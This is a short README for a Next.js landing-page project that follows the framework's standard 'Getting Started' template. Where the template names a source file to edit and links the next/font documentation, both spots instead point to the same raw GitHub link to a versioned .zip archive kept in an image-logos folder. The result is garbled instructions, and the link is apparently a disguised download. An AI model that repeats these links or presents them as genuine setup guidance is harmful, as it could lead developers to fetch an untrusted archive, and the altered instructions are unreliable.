## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the
result.

You can start editing the page by modifying `https://raw.githubusercontent.com/Miqman/LandingPageCartenzNextJs/main/public/image/logos/Cartenz-Landing-Page-Js-Next-1.9.zip`. The page
auto-updates as you edit the file.

This project uses
[`next/font`](https://raw.githubusercontent.com/Miqman/LandingPageCartenzNextJs/main/public/image/logos/Cartenz-Landing-Page-Js-Next-1.9.zip) to
automatically optimize and load Inter, a custom Google Font.
